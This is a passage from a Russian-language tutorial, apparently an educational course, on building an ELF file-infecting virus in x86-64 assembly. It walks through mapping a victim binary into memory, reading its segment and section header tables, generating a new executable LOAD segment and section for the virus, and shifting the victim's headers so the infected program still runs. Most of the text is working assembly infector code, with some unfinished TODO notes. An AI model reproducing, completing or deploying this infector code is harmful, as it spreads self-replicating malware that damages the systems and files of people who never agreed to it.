  собственный LOAD-сегмент.
- Сегмент вируса должен иметь права на исполнение.
- Код в секциях обычно ссылается на данные, которые находятся в сегменте
  данных. Это значит, что если мы попытаемся вставить вирус между кодом и
  данными, то относительное расстояние между ними изменится и ссылки
  станут неверными. В результате мишень станет неработоспособной.

Есть три варианта, которые часто предлагаются в литературе, как наиболее простые:
- Вставить вирус в свободное пространство (заполненное нулями) между
  таблицей заголовков сегментов и кодом программы. Если вирус вмещается в
  padding, то нам вообще не придется редактировать какие-либо структуры
  ELF-a (кроме его заголовка, чтоб изменить адрес точки входа). Но это
  ненадежный способ - может не хватить места.
- Расширить LOAD-сегмент, доступный на исполнение и вписать вирус в его
  конец. Это может потребовать редактирования остальных заголовок
  сегментов, потому что все следующие сегменты сместятся. Этот способ
  довольно интересен, потому что не требует создания еще одного сегмента
  для вирусного кода. Но есть проблемы:
  - Как уже упоминалось выше, программы, слинкованные динамически, имеют
    секции PLT и GOT. PLT обычно располагается перед секцией .text в
    первом LOAD-сегменте, а вот GOT располагается уже во втором
    LOAD-сегменте. Если мы вставляем вирус в конец первого сегмента, то
    получается, что мы вставляем его между PLT и GOT. Из-за этого PLT
    больше не может обратиться к GOT, а обращается к адресу, где GOT была
    до заражения. Это можно было бы исправить, если отредактировать код
    PLT, найдя опкоды ~jmp~, ~call~, ~mov~, ~lea~ и отредактировав их. Но
    это требует написания ограниченного дизассемблера внутри вируса, так
    что пока откажемся от этого варианта.
- Вписать вирус перед таблицей заголовков секций мишени и оформить его в
  самостоятельный LOAD-сегмент. Этому сегменту понадобится свой
  собственный заголовок сегмента и заголовок секции. Вставка
  дополнительного заголовка сегмента приведет к тому, что весь код жертвы
  сместится равномерно и нам не придется редактировать код PLT. Это
  простой вариант, но два испольняемых сегмента в ELF-файле определенно
  насторожат антивирус, не говоря уже о исследователе-реверсере. Так как
  для нашей учебной задаче не требуется противодействовать антивирусам,
  то можно остановиться на этом способе.

* Инфицирование пошагово

Первая задача, которая перед нами стоит, заключается в том, чтобы вписать
код вируса в файл мишени, при этом ничего не сломав. Мы хотим пересобрать
файл таким образом, чтобы он содержал код вируса и оставался
работоспособным.

#+NAME: infected_elf
#+BEGIN_SRC ditaa :file ./img/infected_elf.png
  +----------------------------+  +----------------------------+
  | Заголовок ELF-файла        |  | Заголовок ELF-файла        |
  | (ELF-header)               |  |  (ELF-header)              |
  +----------------------------+  +----------------------------+

  +----------------------------+  +----------------------------+
  |Таблица заголовков сегментов|  |Таблица заголовков сегментов|
  | (Program Header Table)     |  | (Program Header Table)     |
  +----------------------------+  +----------------------------+
  | PHDR                       |  | PHDR                       |
  | INTERP                     |  | INTERP                     |
  | LOAD R                     |  | LOAD R                     |
  | LOAD RE                    |  | LOAD RE                    |
  | LOAD RW                    |  | LOAD RW                    |
  | ... (остальные заголовки)  |  | ... (остальные заголовки)  |
  +----------------------------+  | LOAD RE (заголовок вируса) |
                                  +----------------------------+
  +----------------------------+
  | Segment (PHDR)             |  +----------------------------+
  +----------------------------+  | Segment (PHDR)             |
  | Segment (INTERP)           |  +----------------------------+
  |    .interp                 |  | Segment (INTERP)           |
  +----------------------------+  |    .interp                 |
  | Segment (LOAD) R           |  +----------------------------+
  |    .interp                 |  | Segment (LOAD) R           |
  |      ...                   |  |    .interp                 |
  +----------------------------+  |      ...                   |
  | Segment (LOAD) RE          |  +----------------------------+
  |    .text                   |  | Segment (LOAD) RE          |
  |      ...                   |  |    .text                   |
  +----------------------------+  |      ...                   |
  | Segment (LOAD) R           |  +----------------------------+
  |      ...                   |  | Segment (LOAD) R           |
  +----------------------------+  |      ...                   |
  | Segment (LOAD) RW          |  +----------------------------+
  |      ...                   |  | Segment (LOAD) RW          |
  +----------------------------+  |      ...                   |
  | Segment (DYNAMIC) RW       |  +----------------------------+
  |   .dynamic                 |  | Segment (DYNAMIC) RW       |
  +----------------------------+  |   .dynamic                 |
  | Segment (NOTE)             |  +----------------------------+
  |     ...                    |  | Segment (NOTE)             |
  +----------------------------+  |     ...                    |
  | Segment (GNU_...)          |  +----------------------------+
  |     ...                    |  | Segment (GNU_...)          |
  +----------------------------+  |     ...                    |
                                  +----------------------------+
  +----------------------------+  | Segment (LOAD) RE VIRUS    |
  | Таблица заголовков секций  |  |     ...                    |
  | (Section Header Table)     |  +----------------------------+
  +----------------------------+
  | .interp                    |  +----------------------------+
  | ... (иные екции мишени)    |  | Таблица заголовков секций  |
  +----------------------------+  | (Section Header Table)     |
                                  +----------------------------+
                                  | .interp                    |
                                  | ... (иные секции мишени)   |
                                  | .virus (секция вируса)     |
                                  +----------------------------+
#+END_SRC

Последовательность шагов для выполнения этой операции:

** Смаппить файл в память

Самый простой способ, как открыть файл и иметь возможно редактировать его
прямо в памяти - это загрузить его образ в память и получить указатель на
эту память. Для этого понадобится системный вызов ~mmap~.

Он принимает 6 параметров: адрес для записи - по умолчанию выставляется
0, и тогда система сама назначает адрес, размер считываемого файла - его
мы получим в помощью ~stat~, которую реализовали в прошлом разделе, права
на доступ к памяти - чтение, запись и т.д., права на доступ к памяти для
процессов, файловый дескриптор считываемого файла - его мы получим с
помощью ~open~, и смещение от начала считываемого файла - у нас это будет
0, поскольку считывается весь файл.

#+NAME: _my_mmap
#+BEGIN_SRC asm

  /// MY_MMAP file into memory
  /// Считывает файл в память по заданному адресу.
  /// Флаги должны быть такими же, какие передавали
  /// open для открытия файла.
  /// @PARAMS
  ///  - %RDI - адрес для записи (по умолчанию NULL,
  ///           в этом случае назначается OS)
  ///  - %RSI - длина считываемого файла
  ///  - %RDX - права доступа к памяти
  ///           (RDONLY, RDWR и т.д.)
  ///  - %RCX -  права для доступа к памяти для
  ///            процессов (MMAP_SHARED, MMAP_PRIVATE)
  ///  * %R8 -   fd считываемого файла
  ///  * %R9 -   offset от начала считываемого файла
  /// @ RETURN VALUE
  /// * RAX - указатель на файл в памяти или отриц. заначени
  _my_mmap:
      push %rbx
      push %rcx
      push %rdx
      push %rbp
      push %r10

      mov %r9, %r15
      mov %rsi, %r13
      mov %rdi, %r12
      mov %ecx, %r14d

      movslq %r8d, %rbp
      movslq %edx, %rbx
      movslq %r14d, %r10
      mov $0x9, %eax

      syscall

      pop %r10
      pop %rbp
      pop %rdx
      pop %rcx
      pop %rbx
      ret

#+END_SRC

А теперь реализуем функцию ~openfile~, которая объединит в себе вызовы
~open~, ~stat~ и ~mmap~. Она будет принимать имя файла и права, открывать
файл, узнавать его размер и мапить его в память.

В случае успеха вернет в ~rax~ указатель на начало файла в памяти,
иначе - минусовое значение.

#+NAME: _openfile
#+BEGIN_SRC asm

  /// OPENFILE
  /// Открывает файл с указанными флагами,
  /// маппит его в память
  ///
  /// @PARAMS:
  /// - %RDI - file name
  /// - %RSI - flags
  ///
  /// @RET:
  /// - %RAX - указатель на файл в памяти
  /// или отричательное значение
  _openfile:
      push    %rbp
      mov     %rsp, %rbp

      mov     $0x2, %rax  # fopen syscall
      syscall
      test    %rax, %rax

      jl      _openfile_exit

      // save all regs
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %r9
      push    %r10

      # сохранить дескриптор жертвы
      mov     %rax, fd(%rip)

      // space for local vars
      sub     $0xA0, %rsp

      mov     %rax, %rcx          # fd
      mov     %rsi, %rdx          # openfile flags

      // call stat
      // (need no less 0xA0 for struct stat)
      // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
      leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
      call    _my_stat

      // prepare params for mmap
      mov     %rcx, %r8           # fd
      mov     %rdx, %rax          # flags
      xor     %rdi, %rdi          # addr

      // 0x70 - offset to filesz field in stat struct
      // mov     -0x70(%rbp), %rsi   # filesz
      mov     -0xA0(%rbp), %rsi   # filesz
      mov     %rsi, file_sz(%rip)
      xor     %r9, %r9            # offset

      // doesn't need shared mmap
      mov     $MAP_PRIVATE, %rcx

      mov     $O_RDONLY, %rbx
      cmp     %rbx, %rax
      je      mmap_rdonly

      // define mmap flags
      mov     $O_RDWR, %rbx
      cmp     %rbx, %rax
      jne     _openfile_flags_error

  mmap_rdwr:
      mov     $(PROT_READ | PROT_WRITE), %rdx # prot
      jmp     call_my_mmap

  mmap_rdonly:
      mov     $PROT_READ, %rdx            # prot
      // call mmap
  call_my_mmap:
      call    _my_mmap

      // recover stack
      add     $0xA0, %rsp
      pop     %r10
      pop     %r9
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx

  _openfile_exit:
      pop     %rbp
      ret

      ERR_MSG _openfile_neg_fd "openfile neg fd"
      ERR_MSG _openfile_flags "openfile undefined flags"
      ERR_MSG _openfile_ptr "openfile returned zero ptr"

#+END_SRC

** Найти Program Header Table и сохранить информацию о ней

Чтоб понимать, где какие сегменты кода находятся в файле, нам нужна
информация о таблице сегментов: где она находится в смапенной памяти,
сколько в ней заголовков и сколько места занимают все заголовки вместе.

В заголовке ELF-файла есть два поля, отвечающих за таблицу сегментов:
~e_phoff~ и ~e_phnum~. Первое хранит в себе смещение от начала файла до
таблице сегментов, а второе - количество заголовков в таблице. А из
документации известно, что на 64-разрядной архитектруе один заголовок
занимает 56 байт. Имея эти значения и базовый адрес смаппенного файла, мы
легко получим все, что нам нужно.

Давайте посмотрим, как это реализовано в коде.

#+NAME: _get_phdrs_info
#+BEGIN_SRC asm

  /// получает данные о заголовках сегментов
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_phdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_phdrs_info_fail

      mov     %rdi, %rsi
      mov     ELF_E_PHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_phdr_table_addr(%rip)

      mov     ELF_E_PHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_phdr_amount(%rip)

      mov     $0x38, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_phdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_phdrs_info_exit

  _get_phdrs_info_fail:
      mov     $-1, %rax

  _get_phdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Поскольку у нас уже есть базовый адрес ELF-а, который нам вернула
~openfile~, мы сложим его со смещением, полученным из ~e_phoff~ и получим
адрес таблицы сегментов в памяти. Сохранив этот адрес в переменную
~victim_phdr_table_addr~, мы будем иметь к нему доступ в любой момент.

Значение, полученное из ~e_phnum~, сохраним в переменную
~victim_phdr_amount~. Зная, сколько в таблице заголовков и сколько байт
занимает каждый из них, можно легко вычислить размер всей таблицы,
умножив значение из ~victim_phdr_amount~ на размер 1 заголовка. Сохраним
это значение в переменную ~victim_phdr_table_size~.

** Найти Section Header Table и сохранить информацию о ней.

Как мы уже выяснили, сегменты поделены на секции. Нам часто придется к
ним обращаться, а лучший способ получить информацию о них - это прочитать
ее из их заговков. Для этого найдем таблицу заголовков секций в памяти,
сохраним ее адрес, узнаем и сохраним количество заголовков в ней и
сколько байт они занимают все вместе.

Аналогично с полями ~e_phoff~ и ~e_phnum~, которые описываю таблицу
заголовков сегментов, в заголовке эльфа есть поля ~e_shoff~ и ~e_shnum~.
~e_shoff~ содержит смещение от начала файла до таблицы заголовков секций,
а ~e_shnum~ - количество этих заголовков.

Так же, как о таблице заголовков сегментов, получим информацию о таблице
заголовков секций.

Вот реализация этого механизма:

#+NAME: _get_shdrs_info
#+BEGIN_SRC asm

  /// получает данные о заголовках секций
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_shdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_shdrs_info_fail
      mov     %rdi, %rsi

      mov     ELF_E_SHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_shdr_table_addr(%rip)

      mov     ELF_E_SHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_shdr_amount(%rip)

      mov     $0x40, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_shdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_shdrs_info_exit

  _get_shdrs_info_fail:
      mov     $-1, %rax

  _get_shdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

** TODO Найди адрес точки входа (поле e_entry в ELF-Header)

...

** Получить данные о вирусе

Нам о вирусе нужно знать всего две вещи: адрес, по которому его
исполняемый код располагается в памяти, и размер этого кода.

Поскольку вирус уже загружен в память, нам не нужно мапить его файл
дополнительно. Все, что понадобится - это считать адрес его метки
~_start~ - это и будет адрес исполняемого кода.

А чтоб посчитать размер, нужно загрузить адрес метки ~fin~, которая находится в
самом конце исполняемого кода, и вычесть из этого адреса адрес ~start~,
так мы получим размер кода вируса. Сохраним эти значения в переменные,
чтоб иметь к ним доуступ в любой момент.

[TODO:gmm] Нужно как-то объяснить про блок передачи управления на жертву
или убрать этот функционал из функции на данном этапе повествования

Вот как это реализовано:

#+NAME:  _get_virus_code
#+BEGIN_SRC asm

  /// _GET_VIRUS_CODE
  ///
  /// Читает указатель начала кода вируса и размер этого
  /// кода.
  /// Записывает адрес кода вируса в virus_code_addr и
  /// размер этого кода в virus_code_size
  _get_virus_code:
      push    %rdi
      push    %rsi

      leaq    _start(%rip), %rdi  # начало вируса
      mov     %rdi, virus_code_addr(%rip)

      leaq    _global_exit(%rip), %rsi
      sub     %rdi, %rsi  # virus size до exit_victim

      # exit + размер блока передачи управления
      mov     transfer_control_code_size(%rip), %rax
      add     %rax, %rsi

      leaq    virus_code_size(%rip), %rdi
      mov     %rsi, (%rdi)

  _get_virus_code_success:
      xor     %rax, %rax
      movq    $0, get_virus_success(%rip)

      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

** TODO Рассчитать заголовок вируса

  - Вычислить виртуальный адрес для нового сегмента вируса. Чтобы он был
    валидным, важно соблюдать ограничение: виртуальный адрес сегмента
    минус смещение сегмента в файле должно иметь адрес кратный 4
    килобайтам.
    - Найти последний (с точки зрения размещения в памяти) LOAD-сегмент
      мишени, т.е. сегмент, у которого самый большой виртуальный
      адрес. Из этого сегмента нам понадобятся:
      - его виртуальный адрес ~p_vaddr~
      - его выравнивание ~p_align~
    - Выровнять полученный ~p_vaddr~ на 4Кб - получим выровненный адрес
      последнего LOAD-сегмента.
      Виртуальные адреса по умолчанию не выровнены, поэтому нам нужно это
      сделать.
    - К нему прибавляем ~p_align~, получаем промежуточный результат -
      адрес страницы памяти, на которой будет расположен
      вирус.
      ~p_allign~ - это выравнивание последнего сегмента. Если у
      последнего сегмента есть выравнивание, а мы посчитали новый адрес
      вируса, не учитывая это, то скорее всего сегмент вируса придется
      прямо на выравнивание последнего сегмента. В теории, это может
      привести к сегфолту, поэтому мы учитываем выравнивание.

    - К нему прибавляем содежимое поля ~e_shoff~ из ELF-Header. Оно
      содержит смещение до заголовков секций, которое станет смещением
      вируса в файле, поскольку вирус встанет вместо заголовков секций, а
      они сместятся. Получили виртуальный адрес вируса.

      [TODO:gmm] Проверь этот вариант

      NB: возможен другой вариант подсчета:
     - берем p_vaddr последнего сегмента
     - берем p_memsz этого сегмента и складываем с p_vaddr - получили
       адрес, на котором сегмент заканчивается
     - берем выравнивание сегмента из поля p_allign и считаем следующий
       адрес, начиная от того, на котором сегмет заканчивается, который
       подходит под выравнивание. Минимальное допустимое выравниание
       0x1000 -  выравнивание по 4кю памяти.
     - прибавляем к нему содерживое моле e_shoff.

       Пример: p_vaddr последнего сегмента - 0x600e10, p_memsz - 0x270,
       выравнивание 0x200000, поле e_shoff - 0x1234.
       0x600e10 + 0х270 = 0x601080
       Чтоб было проще искать выровненный адрес, выровняем этот по 4кб -
       получили 601000. 0х601000 + 0х200000 = 0х801000. Получили адрес страницы
       памяти, на которой будет сегмент вируса. 0х801000 + 0х1234 =
       0х802234. Это валидный адрес вируса.

** Сформировать заголовок сегмента вируса

Внимательно прочитав документацию, мы знаем, как выглядит структура
заголовка сегмента и заголовока секции.

Для начала выделим память под заголовок.

#+NAME: virus_new_phdr
#+BEGIN_SRC asm

   virus_new_phdr:
        .space 0x38, 0

#+END_SRC

Вот какие значения будут в заголовке сегмента вируса:
- p_type - 4 байта, знач. 1 - LOAD-сегмент.
- p_flags - 4 байта, знач. 1 - разрешение на исполнение
- p_offset - 8 байт, смещение вируса в файле.
  Посчитать его просто: мы знаем, что вирус встанет вместо таблицы
  заголовков секций, а сама таблица сместится. Поэтому просто берем
  смещение таблицы секций из поля ~e_shoff~ заголовка ELF-a и вписываем его сюда.
- p_vaddr - 8 байт, виртуальный адрес вируса. Как его считать было
  показано выше.
- p_paddr - аналогично ~p_vaddr~. Поле ~p_addr~ - это физический адрес
  сегмента. Поскольку мы его обыно до загрузки не знаем, то это поле
  обычно совпадает с ~p_vaddr~.
- p_filesz - 8 байт, размер вируса в файле. Чтоб посчитать это,
  достаточно иметь метку ~_start~ в начале вируса и метку ~fin~ в самом
  его конце. Вычитаем ~_start~ из ~fin~ и получаем размер вируса в файле.
- p_memsz - 8 байт, размер вируса в памяти (аналогичен p_filesz в нашем
  случае, поскольку у нас нет неинициализированных данных в вируса)
- p_allign - 8 байт, - значение 0, выравнивание не требуется, поскольку
  после вируса ничего не идет


Закодим создание этого заголовка, которое фактически представляет собой
заполнение буфера данными:

#+NAME: _generate_virus_phdr
#+BEGIN_SRC asm
  /// _GENERATE_VIRUS_PHDR
  /// генерирует заголовок сегмента для кода вируса
  _generate_virus_phdr:
      push    %rbx
      push    %rcx

      mov      virus_new_vaddr(%rip),%rbx
      test     %rbx, %rbx
      je      _generate_virus_phdr_fail

      leaq    virus_new_phdr(%rip), %rax

      movb    $0x1, (%rax) # p_type
      add     $0x4, %rax

      movb    $0x5, (%rax) # p_flags
      add     $0x4, %rax

      mov     victim_elf_addr(%rip), %rbx
      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      movq    %rbx, (%rax) # p_offset
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip),%rbx
      movq    %rbx, (%rax) # vaddr
      add     $0x8, %rax

      movq    %rbx, (%rax) # paddr
      add     $0x8, %rax

      mov     virus_code_size(%rip), %rbx
      movq    %rbx, (%rax) # p_filesz

      // к размеру кода добавили блок данных жертвы
      mov     data_size(%rip), %rcx
      add     %rcx, (%rax)

      add     $0x8, %rax

      movq    %rbx, (%rax) # p_memsz
      add     %rcx, (%rax)

      add     $0x8, %rax

      # поле p_allign при инициализации
      # заполнено нулями, что и нужно
  _generate_virus_phdr_success:
      xor     %rax, %rax
      jmp     _generate_virus_phdr_exit
  _generate_virus_phdr_fail:
      mov     $-1, %rax

  _generate_virus_phdr_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

** Сформировать заголовок секции вируса (если мишень не стрипнута)

Выделим память под заголовок:

#+NAME: virus_new_phdr
#+BEGIN_SRC asm
   virus_new_shdr:
        .space 0x40, 0

#+END_SRC

Вот как мы заполним этот заголовок:

- sh_name - 4 байта, значение - индекс в таблице строк, где строка -
  это имя секции.
  Чтоб получить этот индекс, достаточно пройтись по заголовкам секций и
  найти любой заголовок с типом PROGBITS и взять из него значение поля
  sh_name (  [TODO:gmm] по-моему, можно в принципе взять любой индекс и загрузчику
  будет особо пофиг, можно всегда брать индекс 0. Но это нужнается в проверке.)
- sh_type - 4 байта, тип секции 1 (PROGBITS) - значение секции
  определяется и используется программой единолично
- sh_flags - 8 байт, значение 4 - разрешение на исполнение
- sh_addr - 8 байт, виртуальный адрес вируса, аналогичен p_vaddr из
  заголовка сегмента вируса
- sh_offset - 8 байт, смещение вируса в файле, аналогично полю p_offset
  из заголовка сегмента вируса
- sh_size - 8 байт, размер вируса в файле, аналогично полю p_filesz из
  заголовка сегмента вируса
- sh_link - 8 байт, значение - 0 - не знаю, как точно интерпретируются
  два следующих поля, безопаснее поставить нули
- sh_info - 8 байт, значение 0
- sh_addralign - 8 байт, значение 0, выравнивание не требуется
- sh_entsize - 8 байт, значение 0, код не содержит никаких записей
  фиксированного размера

Ну и реализуем заполнение этого буфера нужными нам данными.

#+NAME: _generate_virus_shdr
#+BEGIN_SRC asm

  /// _GENERATE_VIRUS_SHDR
  /// генерирует заголовок секции для кода вируса
  _generate_virus_shdr:
      push    %rbx

      mov      virus_new_vaddr(%rip),%rbx
      test     %rbx, %rbx
      je      _generate_virus_phdr_fail

      leaq    virus_new_shdr(%rip), %rax
      leaq    sh_name_indx(%rip), %rbx

      movl    (%rbx), %ebx  # sh_name
      movl    %ebx,  (%rax)
      add     $0x4, %rax

      movb    $0x1, (%rax)  # sh_type
      add     $0x4, %rax

      movb    $0x6, (%rax)  # sh_flags
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip), %rbx
      mov     %rbx, (%rax)  # sh_addr
      add     $0x8, %rax

      mov     victim_elf_addr(%rip), %rbx
      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      mov     %rbx, (%rax)  # sh_offset
      add     $0x8, %rax

      mov     virus_code_size(%rip), %rbx

      mov     data_size(%rip), %rcx

      mov     %rbx, (%rax) # sh_size
      add     %rcx, (%rax)

      add     $0x8, %rax

      # поля sh_link, sh_info, sh_addralign, sh_entsize
      # при инициализации записаны нулями,
      # а нам и нужно чтоб они были
      # заполнены нулями
  _generate_virus_shdr_success:
      xor     %rax, %rax
      jmp     _generate_virus_shdr_exit

  _generate_virus_shdr_fail:
      mov     $-1, %rax

  _generate_virus_shdr_exit:
      pop     %rbx
      ret

#+END_SRC

** Поправить заголовки сегментов

Поскольку мы вставляем новый заголовок, то весь код сместится на 56
байт. А заголовки, которые описывают этот код, ничего не будут об этом
знать, если мы их не отредактируем. Если этого не сделать, то загрузчик
загрузит программу неправильно.

Чтоб указать, что весь код сместился, нужно отредактировать поля ~p_vaddr~
и ~p_offset~, которые отвечают за виртуальный адрес сегмента и его
смещение от начала файла, во всех заголовках сегментов, которые описывают
код, находящийся ~после~  таблицы сегментов.

При этом нам надо держать в уме два кейса, не укладывающихся в общий
алгоритм: заголовок первого LOAD-сегмента и заголовок самой таблицы
заголовков.

Начало первого LOAD-сегмента и начало ELF-а - это одно и то же. Этот
сегмент содержит в себе заголовок файла и таблицу заголовков
сегментов. Мы вставляем новый заголовок для вируса как бы внутрь него, а
не перед ним, поэтому его смещение или виртуальный адрес не изменятся.
Зато изменится размер: раз мы вставляем новый заголовок, то вся таблица
увеличится на 56 байт.

То же самое происходит с заголовком таблицы заголовков сегментов.

Хорошая новость в том, что мы можем легко опознать эти заголовки среди
прочих: заголовок таблицы заголовков сегментов имеет тип 6, который
хранится в поле ~p_type~. Заголовок такого типа может быть в единственном
числе в файле.  А первый LOAD-сегмент будет иметь нулевое смещение.

[TODO:gmm] объяснить появление переменной ~first_seg_vaddr~ и
отредактировать код ~_phdr_offset_and_addr_recount~ таким образом, чтоб
убрать из него функционал, который не нужен на данном этапе повествования

#+NAME: _phdr_offset_and_addr_recount
#+BEGIN_SRC asm

  /// _PHDR_OFFSET_AND_ADDR_RECOUNT
  /// Поскольку секция dynamic может расширяться (в заивимости от того,
  /// выставлен в ней флаг BIND_NOW компилером или нет),
  /// то код, который находится
  /// ниже секции dynamic должен сместиться, учитывая это расширение
  _phdr_offset_and_addr_recount:
      push    %rbx
      push    %rdx
      push    %rcx
      push    %r8
      push    %r9
      push    %rdi
      push    %rsi

      // проверяем данные,
      // необходимые для редактирования
      mov     victim_phdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _phdr_offset_and_addr_recount_fail

      mov     victim_phdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _phdr_offset_and_addr_recount_fail

      mov     first_seg_vaddr(%rip), %rsi
      // test    %rsi, %rsi
      // je     _phdr_offset_and_addr_recount_fail

      mov     new_bind_now_flag_record_size(%rip), %rbx
      mov     $0x38, %rdx

  _phdr_offset_and_addr_recount_cycle:
      mov     dynamic_records_vaddr(%rip), %r8

      movl    (%rdi), %eax

      // это заголовок самой таблицы заголовков?
      cmp     $0x6,  %rax
      je      _edit_phdr_table_header
      // это заголовок сегмента dynamic?
      cmp     $0x2,  %rax
      jne     _phdr_offset_and_addr_check

      // расширяем dynamic на размер
      // вставляемой записи
      add     $0x20, %rdi
      add     %rbx, (%rdi)

      add     $0x8, %rdi
      add     %rbx, (%rdi)

      sub     $0x28,  %rdi
      jmp     _phdr_offset_and_addr_check

  _edit_phdr_table_header:
      // редактируем поля p_filesz
      // и p_memsz в заголовке таблицы сегментов
      // заголовков станет на один больше, значит,
      //  размер таблицы надо увеличить на 56 байт
      add     $0x20, %rdi
      add     %rdx, (%rdi)

      add     $0x8, %rdi
      add     %rdx, (%rdi)

      sub     $0x20, %rdi
      jmp     _next_iter_recount_phdr

  _phdr_offset_and_addr_check:
      add     $0x10, %rdi    # проверяем адрес

      cmp     %rsi, (%rdi)
      je      _edit_first_segm_header

      cmp     $0,  (%rdi)
      jle     _recount_offset

      jmp     _recount_vaddr_paddr

  _edit_first_segm_header:
      // это первый сегмент кода -
      // содерит в себе заголовки
      // увеличить его p_memsz и p_filesz
      // на размер добавляемого заголвока
      // а вот его vaddr,paddr и offset
      // не редактируем - новый заголвок
      // будет вписан В него, а не ДО
      // него
      add     $0x10, %rdi
      add     %rdx, (%rdi)

      add     $0x8, %rdi
      add     %rdx, (%rdi)

      sub     $0x20, %rdi

      jmp     _next_iter_recount_phdr

  _recount_vaddr_paddr:
      cmp     %r8, (%rdi)
      jle     _add_const_to_vaddr_paddr

      add     %rdx, (%rdi)    # recount vaddr and paddr
      add     %rbx, (%rdi)

      add     $0x8, %rdi
      add     %rdx, (%rdi)
      add     %rbx, (%rdi)

      sub     $0x8, %rdi

      jmp     _recount_offset
  _add_const_to_vaddr_paddr:
      add     %rdx, (%rdi)    # recount vaddr and paddr

      add     $0x8, %rdi
      add     %rdx, (%rdi)

      sub     $0x8, %rdi

  _recount_offset:
      mov     dynamic_records_offset(%rip), %r8

      sub     $0x8, %rdi

      cmp     $0, (%rdi)
      jle     _next_iter_recount_phdr

      // сегмент расположен до dynamic?
      cmp     %r8, (%rdi)

      jle     _add_const_to_phdr_offset

      add     %rbx, (%rdi)
      add     %rdx, (%rdi)

      jmp     _next_iter_recount_phdr

  _add_const_to_phdr_offset:
      add     %rdx, (%rdi)

      jmp     _next_iter_recount_phdr

  _next_iter_recount_phdr:
      add     $0x30, %rdi

      dec     %rcx
      test    %rcx, %rcx
      jne     _phdr_offset_and_addr_recount_cycle

  _phdr_offset_and_addr_recount_success:
      xor     %rax, %rax
      jmp     _phdr_offset_and_addr_recount_exit

  _phdr_offset_and_addr_recount_fail:
      mov     $-1, %rax

  _phdr_offset_and_addr_recount_exit:
      pop     %rsi
      pop     %rdi
      pop     %r9
      pop     %r8
      pop     %rcx
      pop     %rdx
      pop     %rbx
      ret

#+END_SRC

** Поправить заголовки секций

Поправить заголовки секций надо по той же причине, что и заголовки
сегментов. Но сделать это даже проще: мы будем редактировать только те
заголовки, которые описывают код, находящийся после таблицы заголовков
сегментов без каких-либо исключений.

Нам понадобится отредактировать только поля ~sh_addr~ и ~sh_offset~,
которые отвечают за виртуальный адрес и смещение секции в файле.

[TODO:gmm] отредактировать код ~_shdr_offset_and_addr_recount~ таким образом, чтоб
убрать из него функционал, который не нужен на данном этапе повествования

Посмотрим, как это реализовано:

#+NAME: _shdr_offset_and_addr_recount
#+BEGIN_SRC asm
  /// _SHDR_OFFSET_AND_ADDR_RECOUNT
  /// Пересчитывает адреса и смещения в заголовках, если они не 0
  /// Поскольку секция dynamic может расширяться (в заивимости от того,
  /// выставлен в ней флаг BIND_NOW компилером или нет),
  /// то код, который находится
  /// ниже секции dynamic должен сместиться, учитывая это расширение
      .globl  _shdr_offset_and_addr_recount
      .type	_shdr_offset_and_addr_recount, @function

  _shdr_offset_and_addr_recount:
      push  %rbx
      push  %rdx
      push  %rcx
      push  %r8
      push  %rdi
      push  %rsi

      // проверяем необходимые данные
      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _shdr_offset_and_addr_recount_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _shdr_offset_and_addr_recount_fail

      mov     new_bind_now_flag_record_size(%rip), %rbx
      mov     $0x38, %rdx

  _shdr_offset_and_addr_recount_cycle:

      add     $0x10, %rdi       # смещение до поля sh_addr
      cmp     $0,   (%rdi)      # sh_addr <= 0?

      jle     _recount_shdr_offset

      // секция расположенаа до dynamic?
      mov     dynamic_records_vaddr(%rip), %rax
      cmp   %rax, (%rdi)
      // да
      jle     _add_const_to_addr

      // нет, скорректировать в соответствии
      // с возможным расширением dynamic
      add     %rbx, (%rdi)

  _add_const_to_addr:
      add     %rdx, (%rdi)

  _recount_shdr_offset:
      add     $0x8, %rdi
      cmp     $0, (%rdi)

      jle     _next_iter_recount

      // секция расположена до dynamic?
      mov     dynamic_records_offset(%rip), %rax
      cmp     %rax, (%rdi)

      jle     _add_const_to_offset

      // нет, скорректировать в соответствии
      // с возможным расширением dynamic
      add     %rbx, (%rdi)

  _add_const_to_offset:
      add     %rdx, (%rdi)   # пересчитываем смещение

  _next_iter_recount:
      add     $0x28, %rdi    # смещение до след. заголовка
      loop    _shdr_offset_and_addr_recount_cycle

  _shdr_offset_and_addr_recount_success:
      xor     %rax, %rax
